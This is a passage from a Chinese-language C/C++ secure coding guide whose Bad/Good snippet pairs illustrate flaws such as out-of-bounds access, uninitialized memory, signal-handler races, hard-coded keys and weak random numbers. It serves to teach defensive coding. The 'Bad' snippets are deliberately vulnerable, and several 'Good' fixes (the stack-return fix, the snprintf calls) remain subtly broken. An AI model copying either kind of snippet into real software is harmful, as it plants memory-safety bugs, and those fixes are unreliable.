title="2 不推荐的编程习惯"></a>2 不推荐的编程习惯</h3><p><a id="1.2.1"></a></p><h4 id="2-1-【必须】switch中应有default"><a href="#2-1-【必须】switch中应有default" class="headerlink" title="2.1 【必须】switch中应有default"></a>2.1 【必须】switch中应有default</h4><p>switch中应该有default，以处理各种预期外的情况。这可以确保switch接受用户输入，或者后期在其他开发者修改函数后确保switch仍可以覆盖到所有情况，并确保逻辑正常运行。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badint Foo(int bar) {  switch (bar &amp; 7) {    case 0:      return Foobar(bar);      break;    case 1:      return Foobar(bar * 2);      break;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例如上述代码switch的取值可能从0～7，所以应当有default：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodint Foo(int bar) {  switch (bar &amp; 7) {    case 0:      return Foobar(bar);      break;    case 1:      return Foobar(bar * 2);      break;    default:      return -1;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><code>中风险-内存泄漏</code></p><p><a id="1.2.2"></a></p><h4 id="2-2-【必须】不应当在Debug或错误信息中提供过多内容"><a href="#2-2-【必须】不应当在Debug或错误信息中提供过多内容" class="headerlink" title="2.2 【必须】不应当在Debug或错误信息中提供过多内容"></a>2.2 【必须】不应当在Debug或错误信息中提供过多内容</h4><p>包含过多信息的Debug消息不应当被用户获取到。Debug信息可能会泄露一些值，例如内存数据、内存地址等内容，这些内容可以帮助攻击者在初步控制程序后，更容易地攻击程序。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badint Foo(int* bar) {  if (bar &amp;&amp; *bar == 5) {    OutputDebugInfoToUser("Wrong value for bar %p = %d\n", bar, *bar);  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而应该：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodint foo(int* bar) {#ifdef DEBUG  if (bar &amp;&amp; *bar == 5) {    OutputDebugInfo("Wrong value for bar.\n");  }#endif}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-信息泄漏</code></p><p><a id="1.2.3"></a></p><h4 id="2-3-【必须】不应该在客户端代码中硬编码对称加密秘钥"><a href="#2-3-【必须】不应该在客户端代码中硬编码对称加密秘钥" class="headerlink" title="2.3 【必须】不应该在客户端代码中硬编码对称加密秘钥"></a>2.3 【必须】不应该在客户端代码中硬编码对称加密秘钥</h4><p>不应该在客户端代码中硬编码对称加密秘钥。例如：不应在客户端代码使用硬编码的 AES/ChaCha20-Poly1305/SM1 密钥，使用固定密钥的程序基本和没有加密一样。</p><p>如果业务需求是认证加密数据传输，应优先考虑直接用 HTTPS 协议。</p><p>如果是其它业务需求，可考虑由服务器端生成对称秘钥，客户端通过 HTTPS 等认证加密通信渠道从服务器拉取。</p><p>或者根据用户特定的会话信息，比如登录认证过程可以根据用户名用户密码业务上下文等信息，使用 HKDF 等算法衍生出对称秘钥。</p><p>又或者使用 RSA/ECDSA + ECDHE 等进行认证秘钥协商，生成对称秘钥。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badchar g_aes_key[] = {...};void Foo() {  ....  AES_func(g_aes_key, input_data, output_data);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以考虑在线为每个用户获取不同的密钥：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodchar* g_aes_key;void Foo() {  ....  AES_encrypt(g_aes_key, input_data, output_data);}void Init() {  g_aes_key = get_key_from_https(user_id, ...);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-信息泄露</code></p><p><a id="1.2.4"></a></p><h4 id="2-4-【必须】返回栈上变量的地址"><a href="#2-4-【必须】返回栈上变量的地址" class="headerlink" title="2.4 【必须】返回栈上变量的地址"></a>2.4 【必须】返回栈上变量的地址</h4><p>函数不可以返回栈上的变量的地址，其内容在函数返回后就会失效。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badchar* Foo(char* sz, int len){  char a[300] = {0};  if (len &gt; 100) {    memcpy(a, sz, 100);  }  a[len] = '\0';  return a;  // WRONG}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而应当使用堆来传递非简单类型变量。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodchar* Foo(char* sz, int len) {    char* a = new char[300];    if (len &gt; 100) {        memcpy(a, sz, 100);    }    a[len] = '\0';    return a;  // OK}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 C++ 程序来说，强烈建议返回 <code>string</code>、<code>vector</code> 等类型，会让代码更加简单和安全。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.2.5"></a></p><h4 id="2-5-【必须】有逻辑联系的数组必须仔细检查"><a href="#2-5-【必须】有逻辑联系的数组必须仔细检查" class="headerlink" title="2.5 【必须】有逻辑联系的数组必须仔细检查"></a>2.5 【必须】有逻辑联系的数组必须仔细检查</h4><p>例如下列程序将字符串转换为week day，但是两个数组并不一样长，导致程序可能会越界读一个int。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badint nWeekdays[] = {1, 2, 3, 4, 5, 6};const char* sWeekdays[] = {"Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"};for (int x = 0; x &lt; ARRAY_SIZE(sWeekdays); x++) {  if (strcmp(sWeekdays[x], input) == 0)    return nWeekdays[x];}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应当确保有关联的nWeekdays和sWeekdays数据统一。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodconst int nWeekdays[] = {1, 2, 3, 4, 5, 6, 7};const char* sWeekdays[] = {"Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"};assert(ARRAY_SIZE(nWeekdays) == ARRAY_SIZE(sWeekdays));for (int x = 0; x &lt; ARRAY_SIZE(sWeekdays); x++) {  if (strcmp(sWeekdays[x], input) == 0) {    return nWeekdays[x];  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.2.6"></a></p><h4 id="2-6-【必须】避免函数的声明和实现不同"><a href="#2-6-【必须】避免函数的声明和实现不同" class="headerlink" title="2.6 【必须】避免函数的声明和实现不同"></a>2.6 【必须】避免函数的声明和实现不同</h4><p>在头文件、源代码、文档中列举的函数声明应当一致，不应当出现定义内容错位的情况。</p><p>错误：</p><p>foo.h</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int CalcArea(int width, int height);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>foo.cc</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int CalcArea(int height, int width) {  // Different from foo.h  if (height &gt; real_height) {    return 0;  }  return height * width;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确：<br>foo.h</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int CalcArea(int height, int width);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>foo.cc</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int CalcArea (int height, int width) {  if (height &gt; real_height) {    return 0;  }  return height * width;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.2.7"></a></p><h4 id="2-7-【必须】检查复制粘贴的重复代码（相同代码通常代表错误）"><a href="#2-7-【必须】检查复制粘贴的重复代码（相同代码通常代表错误）" class="headerlink" title="2.7 【必须】检查复制粘贴的重复代码（相同代码通常代表错误）"></a>2.7 【必须】检查复制粘贴的重复代码（相同代码通常代表错误）</h4><p>当开发中遇到较长的句子时，如果你选择了复制粘贴语句，请记得检查每一行代码，不要出现上下两句一模一样的情况，这通常代表代码哪里出现了错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badvoid Foobar(SomeStruct&amp; foobase, SomeStruct&amp; foo1, SomeStruct&amp; foo2) {  foo1.bar = (foo1.bar &amp; 0xffff) | (foobase.base &amp; 0xffff0000);  foo1.bar = (foo1.bar &amp; 0xffff) | (foobase.base &amp; 0xffff0000);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上例，通常可能是：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodvoid Foobar(SomeStruct&amp; foobase, SomeStruct&amp; foo1, SomeStruct&amp; foo2) {  foo1.bar = (foo1.bar &amp; 0xffff) | (foobase.base &amp; 0xffff0000);  foo2.bar = (foo2.bar &amp; 0xffff) | (foobase.base &amp; 0xffff0000);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最好是把重复的代码片段提取成函数，如果函数比较短，可以考虑定义为 <code>inline</code> 函数，在减少冗余的同时也能确保不会影响性能。</p><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.2.8"></a></p><h4 id="2-8-【必须】左右一致的重复判断-永远为真或假的判断（通常代表错误）"><a href="#2-8-【必须】左右一致的重复判断-永远为真或假的判断（通常代表错误）" class="headerlink" title="2.8  【必须】左右一致的重复判断/永远为真或假的判断（通常代表错误）"></a>2.8  【必须】左右一致的重复判断/永远为真或假的判断（通常代表错误）</h4><p>这通常是由于自动完成或例如Visual Assistant X之类的补全插件导致的问题。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badif (foo1.bar == foo1.bar) {  …}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可能是：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodif (foo1.bar == foo2.bar) {  …}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.2.9"></a></p><h4 id="2-9-【必须】函数每个分支都应有返回值"><a href="#2-9-【必须】函数每个分支都应有返回值" class="headerlink" title="2.9 【必须】函数每个分支都应有返回值"></a>2.9 【必须】函数每个分支都应有返回值</h4><p>函数的每个分支都应该有返回值，否则如果函数走到无返回值的分支，其结果是未知的。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badint Foo(int bar) {  if (bar &gt; 100) {    return 10;  } else if (bar &gt; 10) {    return 1;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述例子当bar&lt;10时，其结果是未知的值。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodint Foo(int bar) {  if (bar &gt; 100) {    return 10;  } else if (bar &gt; 10) {    return 1;  }  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启适当级别的警告（GCC 中为 <code>-Wreturn-type</code> 并已包含在 <code>-Wall</code> 中）并设置为错误，可以在编译阶段发现这类错误。</p><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><code>中风险-信息泄漏</code></p><p><a id="1.2.10"></a></p><h4 id="2-10-【必须】不得使用栈上未初始化的变量"><a href="#2-10-【必须】不得使用栈上未初始化的变量" class="headerlink" title="2.10 【必须】不得使用栈上未初始化的变量"></a>2.10 【必须】不得使用栈上未初始化的变量</h4><p>在栈上声明的变量要注意是否在使用它之前已经初始化了</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badvoid Foo() {  int foo;  if (Bar()) {    foo = 1;  }  Foobar(foo); // foo可能没有初始化}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最好在声明的时候就立刻初始化变量，或者确保每个分支都初始化它。开启相应的编译器警告（GCC 中为 <code>-Wuninitialized</code>），并把设置为错误级别，可以在编译阶段发现这类错误。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodvoid Foo() {  int foo = 0;  if (Bar()) {    foo = 1;  }  Foobar(foo);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><code>中风险-信息泄漏</code></p><p><a id="1.2.11"></a></p><h4 id="2-11-【建议】不得直接使用刚分配的未初始化的内存（如realloc）"><a href="#2-11-【建议】不得直接使用刚分配的未初始化的内存（如realloc）" class="headerlink" title="2.11  【建议】不得直接使用刚分配的未初始化的内存（如realloc）"></a>2.11  【建议】不得直接使用刚分配的未初始化的内存（如realloc）</h4><p>一些刚申请的内存通常是直接从堆上分配的，可能包含有旧数据的，直接使用它们而不初始化，可能会导致安全问题。例如，CVE-2019-13751。应确保初始化变量，或者确保未初始化的值不会泄露给用户。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badchar* Foo() {  char* a = new char[100];  a[99] = '\0';  memcpy(a, "char", 4);  return a;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodchar* Foo() {  char* a = new char[100];  memcpy(a, "char", 4);  a[4] = '\0';  return a;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 C++ 中，再次强烈推荐用 <code>string</code>、<code>vector</code> 代替手动内存分配。</p><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><code>中风险-信息泄漏</code></p><p><a id="1.2.12"></a></p><h4 id="2-12-【必须】校验内存相关函数的返回值"><a href="#2-12-【必须】校验内存相关函数的返回值" class="headerlink" title="2.12 【必须】校验内存相关函数的返回值"></a>2.12 【必须】校验内存相关函数的返回值</h4><p>与内存分配相关的函数需要检查其返回值是否正确，以防导致程序崩溃或逻辑错误。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badvoid Foo() {  char* bar = mmap(0, 0x800000, .....);  *(bar + 0x400000) = '\x88'; // Wrong}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上例mmap如果失败，bar的值将是0xffffffff (ffffffff)，第二行将会往0x3ffffff写入字符，导致越界写。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodvoid Foo() {  char* bar = mmap(0, 0x800000, .....);  if(bar == MAP_FAILED) {    return;  }  *(bar + 0x400000) = '\x88';}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><code>高风险-越界操作</code></p><p><a id="1.2.13"></a></p><h4 id="2-13-【必须】不要在if里面赋值"><a href="#2-13-【必须】不要在if里面赋值" class="headerlink" title="2.13 【必须】不要在if里面赋值"></a>2.13 【必须】不要在if里面赋值</h4><p>if里赋值通常代表代码存在错误。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badvoid Foo() {  if (bar = 0x99) ...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通常应该是：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodvoid Foo() {  if (bar == 0x99) ...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>建议在构建系统中开启足够的编译器警告（GCC 中为 <code>-Wparentheses</code> 并已包含在 <code>-Wall</code> 中），并把该警告设置为错误。</p><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.2.14"></a></p><h4 id="2-14-【建议】确认if里面的按位操作"><a href="#2-14-【建议】确认if里面的按位操作" class="headerlink" title="2.14 【建议】确认if里面的按位操作"></a>2.14 【建议】确认if里面的按位操作</h4><p>if里，非bool类型和非bool类型的按位操作可能代表代码存在错误。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badvoid Foo() {  int bar = 0x1;     // binary 01  int foobar = 0x2;    // binary 10  if (foobar &amp; bar)     // result = 00, false    ...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码可能应该是：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodvoid foo() {  int   bar = 0x1;  int foobar = 0x2;  if (foobar &amp;&amp; bar)  // result : true    ...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.3"></a></p><h3 id="3-多线程"><a href="#3-多线程" class="headerlink" title="3    多线程"></a>3    多线程</h3><p><a id="1.3.1"></a></p><h4 id="3-1-【必须】变量应确保线程安全性"><a href="#3-1-【必须】变量应确保线程安全性" class="headerlink" title="3.1  【必须】变量应确保线程安全性"></a>3.1  【必须】变量应确保线程安全性</h4><p>当一个变量可能被多个线程使用时，应当使用原子操作或加锁操作。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badchar  g_somechar;void foo_thread1() {  g_somechar += 3;}void foo_thread2() {  g_somechar += 1;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于可以使用原子操作的，应当使用一些可以确保内存安全的操作，如：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodvolatile char g_somechar;void foo_thread1() {  __sync_fetch_and_add(&amp;g_somechar, 3);}void foo_thread2() {  __sync_fetch_and_add(&amp;g_somechar, 1);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 C 代码，<code>C11</code> 后推荐使用 <a href="https://en.cppreference.com/w/c/atomic">atomic</a> 标准库。<br>对于 C++代码，<code>C++11</code> 后，推荐使用 <a href="https://zh.cppreference.com/w/cpp/atomic/atomic"><code>std::atomic</code></a>。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑问题</code></p><p><a id="1.3.2"></a></p><h4 id="3-2-【必须】注意signal-handler导致的条件竞争"><a href="#3-2-【必须】注意signal-handler导致的条件竞争" class="headerlink" title="3.2 【必须】注意signal handler导致的条件竞争"></a>3.2 【必须】注意signal handler导致的条件竞争</h4><p>竞争条件经常出现在信号处理程序中，因为信号处理程序支持异步操作。攻击者能够利用信号处理程序争用条件导致软件状态损坏，从而可能导致拒绝服务甚至代码执行。</p><ol><li>当信号处理程序中发生不可重入函数或状态敏感操作时，就会出现这些问题。因为信号处理程序中随时可以被调用。比如，当在信号处理程序中调用<code>free</code>时，通常会出现另一个信号争用条件，从而导致双重释放。即使给定指针在释放后设置为<code>NULL</code>，在释放内存和将指针设置为<code>NULL</code>之间仍然存在竞争的可能。</li><li>为多个信号设置了相同的信号处理程序，这尤其有问题——因为这意味着信号处理程序本身可能会重新进入。例如，malloc()和free()是不可重入的，因为它们可能使用全局或静态数据结构来管理内存，并且它们被syslog()等看似无害的函数间接使用；这些函数可能会导致内存损坏和代码执行。</li></ol><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badchar *log_message;void Handler(int signum) {  syslog(LOG_NOTICE, "%s\n", log_m_essage);  free(log_message);  sleep(10);  exit(0);}int main (int argc, char* argv[]) {  log_message = strdup(argv[1]);  signal(SIGHUP, Handler);  signal(SIGTERM, Handler);  sleep(10);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以借由下列操作规避问题：</p><ol><li>避免在多个处理函数中共享某些变量。</li><li>在信号处理程序中使用同步操作。</li><li>屏蔽不相关的信号，从而提供原子性。</li><li>避免在信号处理函数中调用不满足<a href="https://www.man7.org/linux/man-pages/man7/signal-safety.7.html">异步信号安全</a>的函数。</li></ol><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑问题</code></p><p><a id="1.3.3"></a></p><h4 id="3-3-【建议】注意Time-of-check-Time-of-use-TOCTOU-条件竞争"><a href="#3-3-【建议】注意Time-of-check-Time-of-use-TOCTOU-条件竞争" class="headerlink" title="3.3 【建议】注意Time-of-check Time-of-use (TOCTOU) 条件竞争"></a>3.3 【建议】注意Time-of-check Time-of-use (TOCTOU) 条件竞争</h4><p>TOCTOU： 软件在使用某个资源之前检查该资源的状态，但是该资源的状态可以在检查和使用之间更改，从而使检查结果无效。当资源处于这种意外状态时，这可能会导致软件执行错误操作。</p><p>当攻击者可以影响检查和使用之间的资源状态时，此问题可能与安全相关。这可能发生在共享资源(如<strong>文件、内存</strong>，甚至多线程程序中的<strong>变量</strong>)上。在编程时需要注意避免出现TOCTOU问题。</p><p>例如，下面的例子中，该文件可能已经在检查和lstat之间进行了更新，特别是因为printf有延迟。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct stat *st;lstat("...", st);printf("foo");if (st-&gt;st_mtimespec == ...) {  printf("Now updating things\n");  UpdateThings();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>TOCTOU难以修复，但是有以下缓解方案：</p><ol><li>限制对来自多个进程的文件的交叉操作。</li><li>如果必须在多个进程或线程之间共享对资源的访问，那么请尝试限制”检查“（CHECK）和”使用“（USE）资源之间的时间量，使他们相距尽量不要太远。这不会从根本上解决问题，但可能会使攻击更难成功。</li><li>在Use调用之后重新检查资源，以验证是否正确执行了操作。</li><li>确保一些环境锁定机制能够被用来有效保护资源。但要确保锁定是检查之前进行的，而不是在检查之后进行的，以便检查时的资源与使用时的资源相同。</li></ol><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑问题</code></p><p><a id="1.4"></a></p><h3 id="4-加密解密"><a href="#4-加密解密" class="headerlink" title="4    加密解密"></a>4    加密解密</h3><p><a id="1.4.1"></a></p><h4 id="4-1-【必须】不得明文存储用户密码等敏感数据"><a href="#4-1-【必须】不得明文存储用户密码等敏感数据" class="headerlink" title="4.1  【必须】不得明文存储用户密码等敏感数据"></a>4.1  【必须】不得明文存储用户密码等敏感数据</h4><p>用户密码应该使用 Argon2, scrypt, bcrypt, pbkdf2 等算法做哈希之后再存入存储系统, <a href="https://password-hashing.net/">https://password-hashing.net/</a></p><p><a href="https://libsodium.gitbook.io/doc/password_hashing/default_phf#example-2-password-storage">https://libsodium.gitbook.io/doc/password_hashing/default_phf#example-2-password-storage</a></p><p>用户敏感数据，应该做到传输过程中加密，存储状态下加密<br>传输过程中加密，可以使用 HTTPS 等认证加密通信协议</p><p>存储状态下加密，可以使用 SQLCipher 等类似方案。</p><p><a id="1.4.2"></a></p><h4 id="4-2-【必须】内存中的用户密码等敏感数据应该安全抹除"><a href="#4-2-【必须】内存中的用户密码等敏感数据应该安全抹除" class="headerlink" title="4.2  【必须】内存中的用户密码等敏感数据应该安全抹除"></a>4.2  【必须】内存中的用户密码等敏感数据应该安全抹除</h4><p>例如用户密码等，即使是临时使用，也应在使用完成后应当将内容彻底清空。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;openssl/crypto.h&gt;#include &lt;unistd.h&gt;    {        ...        string user_password(100, '\0');        snprintf(&amp;user_password, "password: %s", user_password.size(), password_from_input);        ...    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">{    ...    string user_password(100, '\0');    snprintf(&amp;user_password, "password: %s", user_password.size(), password_from_input);    ...    OPENSSL_cleanse(&amp;user_password[0], user_password.size());}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-敏感信息泄露</code></p><p><a id="1.4.3"></a></p><h4 id="4-3-【必须】rand-类函数应正确初始化"><a href="#4-3-【必须】rand-类函数应正确初始化" class="headerlink" title="4.3  【必须】rand() 类函数应正确初始化"></a>4.3  【必须】rand() 类函数应正确初始化</h4><p>rand类函数的随机性并不高。而且在使用前需要使用srand()来初始化。未初始化的随机数可能导致某些内容可预测。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badint main() {  int foo = rand();  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码执行完成后，foo的值是固定的。它等效于 <code>srand(1); rand();</code>。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodint main() {  srand(time(0));  int foo = rand();  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-逻辑漏洞</code></p><p><a id="1.4.4"></a></p><h4 id="4-4-【必须】在需要高强度安全加密时不应使用弱PRNG函数"><a href="#4-4-【必须】在需要高强度安全加密时不应使用弱PRNG函数" class="headerlink" title="4.4  【必须】在需要高强度安全加密时不应使用弱PRNG函数"></a>4.4  【必须】在需要高强度安全加密时不应使用弱PRNG函数</h4><p>在需要生成 AES/SM1/HMAC 等算法的密钥/IV/Nonce， RSA/ECDSA/ECDH 等算法的私钥，这类需要高安全性的业务场景，必须使用密码学安全的随机数生成器 (Cryptographically Secure PseudoRandom Number Generator (CSPRNG) ), 不得使用 <code>rand()</code> 等无密码学安全性保证的普通随机数生成器。</p><p>推荐使用的 CSPRNG 有：</p><ol><li><p>OpenSSL 中的 <code>RAND_bytes()</code> 函数, <a href="https://www.openssl.org/docs/man1.1.1/man3/RAND_bytes.html">https://www.openssl.org/docs/man1.1.1/man3/RAND_bytes.html</a></p></li><li><p>libsodium 中的 <code>randombytes_buf()</code> 函数</p></li><li><p>Linux kernel 的 <code>getrandom()</code> 系统调用, <a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">https://man7.org/linux/man-pages/man2/getrandom.2.html</a> .<br>或者读 /dev/urandom 文件, 或者 /dev/random 文件。</p></li><li><p>Apple IOS 的 <code>SecRandomCopyBytes()</code>, <a href="https://developer.apple.com/documentation/security/1399291-secrandomcopybytes">https://developer.apple.com/documentation/security/1399291-secrandomcopybytes</a></p></li><li><p>Windows 下的 <code>BCryptGenRandom()</code>, <code>CryptGenRandom()</code>, <code>RtlGenRandom()</code></p></li></ol><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;openssl/aes.h&gt;#include &lt;openssl/crypto.h&gt;#include &lt;openssl/rand.h&gt;#include &lt;unistd.h&gt;    {        unsigned char key[16];        if (1 != RAND_bytes(&amp;key[0], sizeof(key))) {  //... 错误处理            return -1;        }        AES_KEY aes_key;        if (0 != AES_set_encrypt_key(&amp;key[0], sizeof(key) * 8, &amp;aes_key)) {            // ... 错误处理            return -1;        }        ...        OPENSSL_cleanse(&amp;key[0], sizeof(key));    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>rand()</code>类函数的随机性并不高。敏感操作时，如设计加密算法时，不得使用rand()或者类似的简单线性同余伪随机数生成器来作为随机数发生器。符合该定义的比特序列的特点是，序列中“1”的数量约等于“0”的数量；同理，“01”、“00”、“10”、“11”的数量大致相同，以此类推。</p><p>例如 C 标准库中的 <code>rand()</code> 的实现只是简单的<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=stdlib/random_r.c;hb=glibc-2.28#l353">线性同余算法</a>，生成的伪随机数具有较强的可预测性。</p><p>当需要实现高强度加密，例如涉及通信安全时，不应当使用 <code>rand()</code> 作为随机数发生器。</p><p>实际应用中，<a href="https://docs.microsoft.com/en-us/cpp/standard-library/random-device-class?redirectedfrom=MSDN&amp;view=vs-2019#remarks"> C++11 标准提供的<code>random_device</code>保证加密的安全性和随机性</a><br>但是 <a href="https://stackoverflow.com/questions/44867500/is-stdrandom-device-cryptographic-secure">C++ 标准并不保证这一点</a>。跨平台的代码可以考虑用 <a href="https://wiki.openssl.org/index.php/Random_Numbers">OpenSSL</a> 等保证密码学安全的库里的随机数发生器。</p><p>关联漏洞:</p><p><code>高风险-敏感数据泄露</code></p><p><a id="1.4.5"></a></p><h4 id="4-5-【必须】自己实现的rand范围不应过小"><a href="#4-5-【必须】自己实现的rand范围不应过小" class="headerlink" title="4.5  【必须】自己实现的rand范围不应过小"></a>4.5  